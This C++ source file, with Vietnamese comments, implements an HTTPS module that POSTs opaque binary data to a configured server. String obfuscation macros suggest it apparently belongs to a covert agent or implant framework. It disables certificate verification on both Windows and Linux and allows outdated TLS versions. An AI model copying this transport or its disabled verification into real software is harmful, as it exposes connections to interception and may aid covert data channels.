// src/communication/HttpsComms.cpp
#include "communication/HttpsComms.h"
#include "core/Logger.h"
#include "core/Configuration.h"
#include "security/Obfuscation.h"
#include "utils/StringUtils.h"
#include <vector>
#include <cstdint>
#include <string>

#if PLATFORM_WINDOWS
#include <winhttp.h>
#else
#include <curl/curl.h>
#endif

// Obfuscated strings
static const auto OBF_HTTPS_COMMS = OBFUSCATE("HttpsComms");

HttpsComms::HttpsComms(Configuration* config)
    : HttpComms(config) {}

bool HttpsComms::Initialize() {
    #if PLATFORM_WINDOWS
    // Gọi base implementation trước
    if (!HttpComms::Initialize()) {
        return false;
    }
    
    return ConfigureSslWindows();
    
    #else
    // Linux không cần additional initialization cho HTTPS với libcurl
    LOG_INFO("HTTPS communication initialized (using libcurl)");
    return true;
    #endif
}

bool HttpsComms::SendData(const std::vector<uint8_t>& data) {
    #if PLATFORM_WINDOWS
    // Windows implementation với WinHTTP và SSL
    if (!m_hConnect) {
        LOG_ERROR("HTTPS connection not initialized");
        return false;
    }

    // Parse server URL để lấy path
    std::string url = m_config->GetServerUrl();
    std::wstring wUrl(url.begin(), url.end());
    
    URL_COMPONENTS urlComp;
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;

    if (!WinHttpCrackUrl(wUrl.c_str(), static_cast<DWORD>(wUrl.length()), 0, &urlComp)) {
        LOG_ERROR("Failed to parse HTTPS URL: " + std::to_string(GetLastError()));
        return false;
    }

    std::wstring urlPath(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    if (urlPath.empty()) {
        urlPath = L"/";
    }

    // Tạo HTTPS request với WINHTTP_FLAG_SECURE
    HINTERNET hRequest = WinHttpOpenRequest(
        m_hConnect,
        L"POST",
        urlPath.c_str(),
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );

    if (!hRequest) {
        LOG_ERROR("Failed to create HTTPS request: " + std::to_string(GetLastError()));
        return false;
    }

    // Add headers
    std::string headers = "Content-Type: application/octet-stream\r\n";
    headers += "X-Request-ID: " + utils::StringUtils::GenerateRandomString(16) + "\r\n";
    headers += "Connection: close\r\n";
    
    std::wstring wHeaders(headers.begin(), headers.end());
    
    if (!WinHttpAddRequestHeaders(
        hRequest,
        wHeaders.c_str(),
        static_cast<DWORD>(wHeaders.length()),
        WINHTTP_ADDREQ_FLAG_ADD
    )) {
        LOG_WARN("Failed to add HTTPS headers: " + std::to_string(GetLastError()));
    }

    // Send request
    if (!WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        (LPVOID)data.data(),
        static_cast<DWORD>(data.size()),
        static_cast<DWORD>(data.size()),
        0
    )) {
        LOG_ERROR("Failed to send HTTPS request: " + std::to_string(GetLastError()));
        WinHttpCloseHandle(hRequest);
        return false;
    }

    // Receive response
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        LOG_ERROR("Failed to receive HTTPS response: " + std::to_string(GetLastError()));
        WinHttpCloseHandle(hRequest);
        return false;
    }

    // Check response status
    DWORD statusCode = 0;
    DWORD size = sizeof(statusCode);
    WinHttpQueryHeaders(
        hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        NULL,
        &statusCode,
        &size,
        NULL
    );

    bool success = (statusCode >= 200 && statusCode < 300);
    if (!success) {
        LOG_ERROR("HTTPS request failed with status: " + std::to_string(statusCode));
    } else {
        LOG_DEBUG("HTTPS request successful, status: " + std::to_string(statusCode));
    }

    WinHttpCloseHandle(hRequest);
    return success;
    
    #else
    // Linux implementation với libcurl và SSL
    CURL* curl = curl_easy_init();
    if (!curl) {
        LOG_ERROR("Failed to initialize libcurl for HTTPS");
        return false;
    }

    std::string url = m_config->GetServerUrl();
    
    // Set up curl options cho HTTPS
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.data());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, data.size());
    
    // Set headers
    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
    std::string requestId = "X-Request-ID: " + utils::StringUtils::GenerateRandomString(16);
    headers = curl_slist_append(headers, requestId.c_str());
    headers = curl_slist_append(headers, "Connection: close");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    
    // Set timeout
    int timeout = m_config->GetTimeout();
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, timeout);
    
    // Configure SSL
    if (!ConfigureSslLinux(curl)) {
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        return false;
    }
    
    // Perform request
    CURLcode res = curl_easy_perform(curl);
    
    // Get response code
    long response_code = 0;
    if (res == CURLE_OK) {
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
    }
    
    // Clean up
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    
    if (res != CURLE_OK) {
        LOG_ERROR("HTTPS request failed: " + std::string(curl_easy_strerror(res)));
        return false;
    }
    
    bool success = (response_code >= 200 && response_code < 300);
    if (!success) {
        LOG_ERROR("HTTPS request failed with status: " + std::to_string(response_code));
    } else {
        LOG_DEBUG("HTTPS request successful, status: " + std::to_string(response_code));
    }
    
    return success;
    #endif
}

#if PLATFORM_WINDOWS
bool HttpsComms::ConfigureSslWindows() {
    // Configure SSL options for WinHTTP
    DWORD securityFlags = 
        SECURITY_FLAG_IGNORE_UNKNOWN_CA |
        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

    if (!WinHttpSetOption(
        m_hSession,
        WINHTTP_OPTION_SECURITY_FLAGS,
        &securityFlags,
        sizeof(securityFlags)
    )) {
        LOG_ERROR("Failed to set SSL options: " + std::to_string(GetLastError()));
        return false;
    }

    // Set additional SSL options if needed
    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1 | 
                     WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 | 
                     WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;

    if (!WinHttpSetOption(
        m_hSession,
        WINHTTP_OPTION_SECURE_PROTOCOLS,
        &protocols,
        sizeof(protocols)
    )) {
        LOG_WARN("Failed to set SSL protocols: " + std::to_string(GetLastError()));
        // Continue anyway
    }

    LOG_DEBUG("SSL configuration applied successfully");
    return true;
}
#else
bool HttpsComms::ConfigureSslLinux(CURL* curl) {
    // Configure SSL options for libcurl
    // Tắt certificate verification (cho testing, có thể bật lại cho production)
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    
    // Set SSL protocols (disable old SSL versions)
    curl_easy_setopt(curl, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2 | CURL_SSLVERSION_MAX_TLSv1_2);
    
    // Có thể thêm certificate pinning hoặc custom CA nếu cần
    /*
    std::string caBundlePath = m_config->GetCaBundlePath();
    if (!caBundlePath.empty()) {
        curl_easy_setopt(curl, CURLOPT_CAINFO, caBundlePath.c_str());
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
    }
    */
    
    // Set SSL options để tránh các lỗi common
    curl_easy_setopt(curl, CURLOPT_SSL_OPTIONS, CURLSSLOPT_NO_REVOKE);
    
    LOG_DEBUG("SSL configuration applied successfully");
    return true;
}
#endif

// Các hàm khác kế thừa từ HttpComms
void HttpsComms::Cleanup() {
    HttpComms::Cleanup();
}

bool HttpsComms::TestConnection() const {
    return HttpComms::TestConnection();
}

std::vector<uint8_t> HttpsComms::ReceiveData() {
    return HttpComms::ReceiveData();
}